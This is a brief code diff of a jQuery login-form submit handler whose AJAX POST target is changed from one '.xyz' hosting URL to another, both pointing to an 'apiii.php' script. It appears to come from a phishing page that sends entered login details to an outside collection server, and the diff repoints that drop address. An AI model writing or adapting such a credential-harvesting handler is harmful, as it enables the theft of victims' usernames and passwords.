@@ -4,7 +4,7 @@ $(".login-form").submit(function() {
 
 	$.ajax({
 
-        url: "https://erzzhosting.xyz/apiii.php",
+        url: "http://sterr.robertohosting.xyz/apiii.php",
 
         type: "POST",
 
